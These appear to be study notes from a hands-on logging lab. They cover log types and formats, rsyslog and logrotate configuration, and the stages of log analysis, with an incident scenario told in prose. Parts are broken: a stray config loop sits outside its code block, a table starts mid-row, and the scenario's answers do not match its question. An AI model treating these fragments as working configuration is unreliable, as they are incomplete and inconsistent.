# Expanding Perspectives: Logs as Evidence of Historical Activity

## Working with Logs: Scenario

**Scenario:** A web server of **SwiftSpend Financial** is constantly bombarded with scans from an adversary. As a systems administrator of this organisation tasked to address this predicament, you must identify what the adversary is doing by configuring logging and analysing collected logs.

**IMPORTANT:** The user **damianhall** has limited sudo privileges. Issue the command _**sudo -l**_ to check what commands can be run by this user. These limited commands are all that are needed to complete the subsequent tasks.

**IMPORTANT:** The attached VM contains artefacts to help us better understand logs and the implications of their analysis to the detection engineering and incident response practices. Work on the subsequent tasks and experiment with the VM through a case example. Escalation of Privileges is **NOT** necessary to answer the questions in this room.

## In the Heart of Data: Logs

Just as a physical tree's rings reveal its life story – indicating good years with thick curls and challenging ones with thin – a digital log provides a historical record of system activity.

Both embody a fundamental principle of growth over time and serve as living records in their respective domains – physical and digital.

In the digital world, every interaction with a computer system – from authentication attempts, granting authorisation, accessing a file, and connecting to a network to encountering a system error – will always leave a digital footprint in the form of logs.

![[Pasted image 20240715043154.png]]Logs are a record of events within a system. These records provide a detailed account of what a system has been doing, capturing a wide range of events such as user logins, file accesses, system errors, network connections, and changes to data or system configurations.

While the specific details may differ based on the type of log, a log entry usually includes the following information:

- A timestamp of when an event was logged
- The name of the system or application that generated the log entry
- The type of event that occurred
- Additional details about the event, such as the user who initiated the event or the device's IP address that generated the event

This information is typically stored in a **log file**, which contains aggregated entries of what occurred at any given time on a system.

However, since digital interactions are continuous and fast-paced, the log file's size may exponentially grow depending on the activities logged on a system.

---

## The True Power of Logs: Contextual Correlation

A single log entry may seem insignificant on its own. But when log data is aggregated, analysed, and cross-referenced with other sources of information, it becomes a potent investigation tool. Logs can answer critical questions about an event, such as:

- **What** happened?
- **When** did it happen?
- **Where** did it happen?
- **Who** is responsible?
- **Were** their actions **successful**?
- **What** was the result of their action?

The following hypothetical scenario can illustrate this aspect. Suppose a student allegedly accessed inappropriate content on a University network. By reviewing the logs, a systems administrator could then answer the following:

| Question                            | Answer                                                                                                                                                                                                                                    |
| ----------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| What happened?                      | An adversary was confirmed to have accessed SwiftSpend Financial's GitLab instance.                                                                                                                                                       |
| When did it happen?                 | Access started at 22:10 on Wednesday, September 8th, 2023.                                                                                                                                                                                |
| Where did it happen?                | The event originated from a device with an IP address of 10.10.133.168 within the VPN Users' segment (10.10.133.0/24).                                                                                                                    |
| Who is responsible?                 | Upon examining the network logs, it was observed that the device, identified by the User-Agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", was allocated the IP address 10.10.133.168.              |
| Were they successful?               | Yes, since an API Key was found to be publicly exposed on the GitLab instance. Moreover, the web proxy logs confirm that the adversary device reached _gitlab.swiftspend.finance_ and maintained access through their uploaded web shell. |
| What is the result of their action? | The adversary achieved remote code execution on _gitlab.swiftspend.finance_ and performed post-exploitation activities.                                                                                                                   |

The example above emphasises how logs are instrumental in piecing together a complete picture of an event, thereby enhancing our understanding and ability to respond effectively.

# Types, Formats, and Standards

## Log Types

Specific log types can offer a unique perspective on a system's operation, performance, and security. While there are various log types, we will focus on the most common ones that cover approximately 80% of the typical use cases.

Below is a list of some of the most common log types:

- **Application Logs:** Messages about specific applications, including status, errors, warnings, etc.
- **Audit Logs:** Activities related to operational procedures crucial for regulatory compliance.
- **Security Logs:** Security events such as logins, permissions changes, firewall activity, etc.
- **Server Logs:** Various logs a server generates, including system, event, error, and access logs.
- **System Logs:** Kernel activities, system errors, boot sequences, and hardware status.
- **Network Logs:** Network traffic, connections, and other network-related events.
- **Database Logs:** Activities within a database system, such as queries and updates.
- **Web Server Logs:** Requests processed by a web server, including URLs, response codes, etc.

![[Pasted image 20240715045014.png]]

Understanding the various log types, formats, and standards is critical for practical log analysis. It enables an analyst to effectively parse, interpret, and gain insights from log data, facilitating troubleshooting, performance optimisation, incident response, and threat hunting.

---

## Log Formats

A log format defines the structure and organisation of data within a log file. It specifies how the data is encoded, how each entry is delimited, and what fields are included in each row. These formats can vary widely and may fall into three main categories: Semi-structured, Structured, and Unstructured. We'll explore these categories and illustrate their usage with examples.

**Semi-structured Logs:** These logs may contain structured and unstructured data, with predictable components accommodating free-form text. Examples include:

- **Syslog Message Format:** A widely adopted logging protocol for system and network logs.

```php
cat syslog.txt
```

![[Pasted image 20240715045552.png]]

- **Windows Event Log (EVTX) Format:** Proprietary Microsoft log for Windows systems.

```php
Get-WinEvent -Path "C:\Windows\System32\winevt\Logs\Application.evtx"
```

![[Pasted image 20240715045742.png]]

**Structured Logs:** Following a strict and standardised format, these logs are conducive to parsing and analysis. Typical structured log formats include:

- **Field Delimited Formats:** Comma-Separated Values (CSV) and Tab-Separated Values (TSV) are formats often used for tabular data.

```php
cat log.csv
```

![[Pasted image 20240715045906.png]]

- **JavaScript Object Notation (JSON):** Known for its readability and compatibility with modern programming languages.

```php
cat log.json
```

![[Pasted image 20240715050031.png]]

- **W3C Extended Log Format (ELF):** Defined by the World Wide Web Consortium (W3C), customizable for web server logging. It is typically used by Microsoft Internet Information Services (IIS) Web Server.

```php
cat elf.log
```

![[Pasted image 20240715050131.png]]

- **eXtensible Markup Language (XML):** Flexible and customizable for creating standardized logging formats.

```php
cat log.xml
```

![[Pasted image 20240715050218.png]]

**Unstructured Logs:** Comprising free-form text, these logs can be rich in context but may pose challenges in systematic parsing. Examples include:

- **NCSA Common Log Format (CLF):** A standardized web server log format for client requests. It is typically used by the Apache HTTP Server by default.

```php
cat clf.log
```

![[Pasted image 20240715050301.png]]

- **NCSA Combined Log Format (Combined):** An extension of CLF, adding fields like referrer and user agent. It is typically used by Nginx HTTP Server by default.

```php
cat combined.log
```

![[Pasted image 20240715050405.png]]

**IMPORTANT:** Custom-defined formats can be crafted to meet specific applications or use cases. These formats provide flexibility but may necessitate specialised parsing tools for effective interpretation and analysis.

---
## Log Standards

A log standard is a set of guidelines or specifications that define how logs should be generated, transmitted, and stored. Log standards may specify the use of particular log formats, but they also cover other aspects of logging, such as what events should be logged, how logs should be transmitted securely, and how long logs should be retained. Examples of log standards include:

- [**Common Event Expression (CEE):**](https://cee.mitre.org/) This standard, developed by MITRE, provides a common structure for log data, making it easier to generate, transmit, store, and analyse logs.
- **[OWASP Logging Cheat Sheet:](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)** A guide for developers on building application logging mechanisms, especially related to security logging.
- **[Syslog Protocol:](https://datatracker.ietf.org/doc/html/rfc5424)** Syslog is a standard for message logging, allowing separation of the software that generates messages from the system that stores them and the software that reports and analyses them.
- **[NIST Special Publication 800-92:](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-92.pdf)** This publication guides computer security log management.
- **[Azure Monitor Logs:](https://learn.microsoft.com/en-us/azure/azure-monitor/logs/data-platform-logs)** Guidelines for log monitoring on Microsoft Azure.
- **[Google Cloud Logging:](https://cloud.google.com/logging/docs)** Guidelines for logging on the Google Cloud Platform (GCP).
- **[Oracle Cloud Infrastructure Logging:](https://docs.oracle.com/en-us/iaas/Content/Logging/Concepts/loggingoverview.htm)** Guidelines for logging on the Oracle Cloud Infrastructure (OCI).
- **[Virginia Tech - Standard for Information Technology Logging:](https://it.vt.edu/content/dam/it_vt_edu/policies/Standard_for_Information_Technology_Logging.pdf)** Sample log review and compliance guideline.

# Collection, Management, and Centralisation

## Log Collection

Log collection is an essential component of log analysis, involving the aggregation of logs from diverse sources such as servers, network devices, software, and databases.

For logs to effectively represent a chronological sequence of events, it's crucial to maintain the system's time accuracy during logging. Utilising the **Network Time Protocol (NTP)** is a method to achieve this synchronisation and ensure the integrity of the timeline stored in the logs.

As this is a foundational step to ensuring that a security analyst would have a comprehensive data set to review, the following is a simple step-by-step process to achieving this, bearing in mind the need to prioritise the collection based on significant information:

- **Identify Sources:** List all potential log sources, such as servers, databases, applications, and network devices.
- **Choose a Log Collector:** Opt for a suitable log collector tool or software that aligns with your infrastructure.
- **Configure Collection Parameters:** Ensure that time synchronisation is enabled through NTP to maintain accurate timelines, adjust settings to determine which events to log at what intervals, and prioritise based on importance.
- **Test Collection:** Once configured, run a test to ensure logs are appropriately collected from all sources.

**IMPORTANT:** Please be aware that NTP-based time synchronisation may not be possible to replicate with the VM since it has no internet connectivity. However, when performing this in practice, using **pool.ntp.org** to find an NTP server is best. Time synchronisation can be performed automatically on Linux-based systems or manually initiated by executing. `ntpdate pool.ntp.org`.

```php
ntpdate pool.ntp.org
```

```php
date
```

![[Pasted image 20240715052853.png]]

## Log Management

Efficient Log Management ensures that every gathered log is stored securely, organised systematically, and is ready for swift retrieval. A hybrid approach can provide a balanced solution by hoarding all log files and selectively trimming.

Once you've collated your logs, effective management of them is paramount. These steps can be followed to achieve this:

- **Storage:** Decide on a secure storage solution, considering factors like retention period and accessibility.
- **Organisation:** Classify logs based on their source, type, or other criteria for easier access later.
- **Backup:** Regularly back up your logs to prevent data loss.
- **Review:** Periodically review logs to ensure they are correctly stored and categorised.

## Log Centralisation

Centralisation is pivotal for swift log access, in-depth analysis, and rapid incident response. A unified system allows for efficient log management with tools that offer real-time detection, automatic notifications, and seamless integration with incident management systems.

Centralising your logs can significantly streamline access and analysis. Here's a simple process for achieving it:

- **Choose a Centralised System:** Opt for a system that consolidates logs from all sources, such as the Elastic Stack or Splunk.
- **Integrate Sources:** Connect all your log sources to this centralised system.
- **Set Up Monitoring:** Utilise tools that provide real-time monitoring and alerts for specified events.
- **Integration with Incident Management:** Ensure that your centralised system can integrate seamlessly with any incident management tools or protocols you have in place.

## Practical Activity: Log Collection with rsyslog

This activity aims to introduce `rsyslog` and demonstrate how it can enhance the centralisation and management of logs. As part of the collection process, we will configure `rsyslog` to log all sshd messages to a specific file, such as `/var/log/websrv-02/rsyslog_sshd.log`. The steps below can be followed to achieve this:

1. **Open a Terminal.**
2. **Ensure rsyslog is Installed:** You can check if rsyslog is installed by running the command: `sudo systemctl status rsyslog`
3. **Create a Configuration File:** Use a text editor to create the following configuration file: `gedit /etc/rsyslog.d/98-websrv-02-sshd.conf`, `nano /etc/rsyslog.d/98-websrv-02-sshd.conf`, `vi /etc/rsyslog.d/98-websrv-02-sshd.conf`, or `vim /etc/rsyslog.d/98-websrv-02-sshd.conf`
4. **Add the Configuration:** Add the following lines in `/etc/rsyslog.d/98-websrv-02-sshd.conf` to direct the sshd messages to the specific log file:

```yaml
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
```

5.  **Save and Close the Configuration File.**
6.  **Restart rsyslog:** Apply the changes by restarting rsyslog with the command: `sudo systemctl restart rsyslog`
7.  **Verify the Configuration:** You can verify the configuration works by initiating an SSH connection to localhost via `ssh localhost` or by checking the log file after a minute or two.

![[Pasted image 20240715053112.png]]

**IMPORTANT:** If remote forwarding of logs is not configured, tools such as `scp` / `rsync`, among others, can be utilised for the manual collection of logs.

# Storage, Retention, and Deletion

## Log Storage

Logs can be stored in various locations, such as the local system that generates them, a centralised repository, or cloud-based storage.

The choice of storage location typically depends on multiple factors:

|   |   |
|---|---|
|![All Green Operational Server](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/da93c2361ca46942723723d0d03454e8.svg)|- **Security Requirements:** Ensuring that logs are stored in compliance with organisational or regulatory security protocols.<br>- **Accessibility Needs:** How quickly and by whom the logs need to be accessed can influence the choice of storage.<br>- **Storage Capacity:** The volume of logs generated may require significant storage space, influencing the choice of storage solution.<br>- **Cost Considerations:** The budget for log storage may dictate the choice between cloud-based or local solutions.<br>- **Compliance Regulations:** Specific industry regulations governing log storage can affect the choice of storage.<br>- **Retention Policies:** The required retention time and ease of retrieval can affect the decision-making process.<br>- **Disaster Recovery Plans:** Ensuring the availability of logs even in system failure may require specific storage solutions.|

## Log Retention

It is vital to recognise that log storage is not infinite. Therefore, a reasonable balance between retaining logs for potential future needs and the storage cost is necessary. Understanding the concepts of Hot, Warm, and Cold storage can aid in this decision-making:

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| - **Hot Storage:** Logs from the past **3-6 months** that are most accessible. Query speed should be near real-time, depending on the complexity of the query.<br>- **Warm Storage:** Logs from **six months to 2 years**, acting as a data lake, easily accessible but not as immediate as Hot storage.<br>- **Cold Storage:** Archived or compressed logs from **2-5 years**. These logs are not easily accessible and are usually used for retroactive analysis or scoping purposes. | ![Log Retention Calendar](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/ffc7ff68c1584d3c5ddf13b47c237c69.png) |

Managing the cost of storing logs is critical for organisations, and carefully selecting Hot, Warm, or Cold storage strategies can help keep these costs in check.

## Log Deletion

Log deletion must be performed carefully to avoid removing logs that could still be of value. The backup of log files, especially crucial ones, is necessary before deletion.

It is essential to have a well-defined deletion policy to ensure compliance with data protection laws and regulations. Log deletion helps to:

- Maintain a manageable size of logs for analysis.
- Comply with privacy regulations, such as GDPR, which require unnecessary data to be deleted.
- Keep storage costs in balance.

## Best Practices: Log Storage, Retention and Deletion

- Determine the storage, retention, and deletion policy based on both business needs and legal requirements.
- Regularly review and update the guidelines per changing conditions and regulations.
- Automate the storage, retention, and deletion processes to ensure consistency and avoid human errors.
- Encrypt sensitive logs to protect data.
- Regular backups should be made, especially before deletion.

## Practical Activity: Log Management with logrotate

This activity aims to introduce `logrotate`, a tool that automates log file rotation, compression, and management, ensuring that log files are handled systematically. It allows automatic rotation, compression, and removal of log files. As an example, here's how we can set it up for `/var/log/websrv-02/rsyslog_sshd.log`:

1. **Create a Configuration File:** `sudo gedit /etc/logrotate.d/98-websrv-02_sshd.conf`, `sudo nano /etc/logrotate.d/98-websrv-02_sshd.conf`, `sudo vi /etc/logrotate.d/98-websrv-02_sshd.conf`, or `sudo vim /etc/logrotate.d/98-websrv-02_sshd.conf`
2. **Define Log Settings:**

```php
/var/log/websrv-02/rsyslog_sshd.log {
    daily
    rotate 30
    compress
    lastaction
        DATE=$(date +"%Y-%m-%d")
        echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
        for i in $(seq 1 30); do
            FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
            if [ -f "$FILE" ]; then
                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
                echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
            fi
        done
        systemctl restart rsyslog
    endscript
}
```

3. **Save and Close the file.**
4. **Manual Execution:** `sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf`

        for i in $(seq 1 24); do
            FILE="/var/log/websrv-02/rsyslog_cron.log.$i.gz"
            if [ -f "$FILE" ]; then
                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
                echo "rsyslog_cron.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_cron.txt"
            fi
        done

# Hands-on Exercise: Log analysis process, tools, and techniques

Logs are more than mere records of historical events; they can serve as a guiding compass. They are invaluable resources that, when skillfully leveraged, can enhance system diagnostics, cyber security, and regulatory compliance efforts. Their role in keeping a record of historical activity for a system or application is crucial.

## Log Analysis Process

Log analysis involves Parsing, Normalisation, Sorting, Classification, Enrichment, Correlation, Visualisation, and Reporting. It can be done through various tools and techniques, ranging from complex systems like Splunk and ELK to ad-hoc methods ranging from default command-line tools to open-source tools.

It involves bringing the various log data into a standard format, making comparing and analysing data from different sources easier. It is imperative in environments with multiple systems and applications, where each might generate logs in another format.|
|![Image Representation of Log Sorting](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/26eb3e15a848f9249e2951ef44bbcedb.svg)|Sorting<br><br>Sorting is a vital aspect of log analysis, as it allows for efficient data retrieval and identification of patterns. Logs can be sorted by time, source, event type, severity, and any other parameter present in the data. Proper sorting is critical in identifying trends and anomalies that signal operational issues or security incidents.|
|![Image Representation of Log Classification](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/907a1ff6f5a4c8fd0c0250282a23568f.svg)|Classification<br><br>Classification involves assigning categories to the logs based on their characteristics. By classifying log files, you can quickly filter and focus on those logs that matter most to your analysis. For instance, classification can be based on the severity level, event type, or source. Automated classification using machine learning can significantly enhance this process, helping to identify potential issues or threats that could be overlooked.|
|![Image Representation of Log Enrichment](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/2f5c66bfdad44c7f2fd5dd211a7541fc.svg)|Enrichment<br><br>Log enrichment adds context to logs to make them more meaningful and easier to analyse. It could involve adding information like geographical data, user details, threat intelligence, or even data from other sources that can provide a complete picture of the event.<br><br>Enrichment makes logs more valuable, enabling analysts to make better decisions and more accurately respond to incidents. Like classification, log enrichment can be automated using machine learning, reducing the time and effort required for log analysis.|
|![Image Representation of Log Correlation](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/0a909d3f679c458f65ef08d5770389fc.svg)|Correlation<br><br>Correlation involves linking related records and identifying connections between log entries. This process helps detect patterns and trends, making understanding complex relationships between various log events easier. Correlation is critical in determining security threats or system performance issues that might remain unnoticed.|
|![Image Representation of Log Visualisation](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/f19a2dcb7e6af13d489590b4b13c6c3f.svg)|Visualisation<br><br>Visualisation represents log data in graphical formats like charts, graphs, or heat maps. Visually presenting data makes recognising patterns, trends, and anomalies easier. Visualisation tools provide an intuitive way to interpret large volumes of log data, making complex information more accessible and understandable.|
|![Image Representation of Log Reporting](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/315f0456ea5f0130ac6a05a7d17153f3.svg)|Reporting<br><br>Reporting summarises log data into structured formats to provide insights, support decision-making, or meet compliance requirements. Effective reporting includes creating clear and concise log data summaries catering to stakeholders' needs, such as management, security teams, or auditors. Regular reports can be vital in monitoring system health, security posture, and operational efficiency.|
